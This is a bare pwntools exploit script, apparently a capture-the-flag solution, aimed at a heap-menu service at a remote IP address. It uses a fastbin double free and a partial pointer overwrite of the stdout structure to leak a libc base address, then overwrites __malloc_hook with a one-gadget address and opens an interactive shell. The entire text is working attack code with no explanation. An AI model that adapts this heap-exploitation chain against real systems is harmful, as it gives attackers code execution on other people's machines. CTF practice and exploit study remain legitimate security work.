from pwn import *
def cmd(c):
	p.sendlineafter(">> \n",str(c))
def Cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size,idx,name="padding"):
	cmd(1)
	p.sendlineafter(": ",str(size))
	p.sendlineafter(": ",str(idx))
	p.sendafter(":\n",name)
def free(idx):
	cmd(2)
	p.sendlineafter(":",str(idx))
def edit(idx,name):
	cmd(3)
	p.sendlineafter(": ",str(idx))
	p.sendafter(":\n",name)
def Add(size,idx,name="padding"):
	Cmd(1)
	p.sendlineafter(": ",str(size))
	p.sendlineafter(": ",str(idx))
	p.sendafter(":",name)
def Free(idx):
	Cmd(2)
	p.sendlineafter(":",str(idx))

#p=process('./pwn')
p=remote("139.180.216.34",8888)
#context.log_level='debug'
add(0x18,0)
add(0x18,1)
add(0x60,2,p64(0x0)+p64(0x21)+'\x00'*0x18+p64(0x21)*5)
add(0x60,3,p64(0x21)*12)
add(0x60,4)
add(0x60,5)
free(0)
free(1)
free(0)
free(1)

add(0x18,0,"\x50")
add(0x18,0,'\x00'*8)
add(0x18,0,"A")

add(0x18,0,'GET')

edit(2,p64(0x0)+p64(0x91))
free(0)

add(0x18,0)
add(0x60,0,'\xdd\x25')

free(2)
free(5)
free(2)
free(5)

#gdb.attach(p,'')
add(0x60,4,'\x70')
#
add(0x60,0)
add(0x60,0)
add(0x60,0)
add(0x60,0,'\x00'*(0x40+3-0x10)+p64(0x1800)+'\x00'*0x19)
p.read(0x40)

base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd2600-0x7ffff7a0d000)
log.warning(hex(base))
#raw_input()
libc=ELF("./pwn").libc
Add(0x60,0)
Add(0x60,1)
Add(0x18,2)
Free(0)
Free(1)
Free(0)
Add(0x60,0,p64(libc.sym['__malloc_hook']+base-35))
Add(0x60,0)
Add(0x60,0)
one=0xf02a4
Add(0x60,0,'\x00'*19+p64(one+base))

Free(1)
Free(1)

p.interactive()
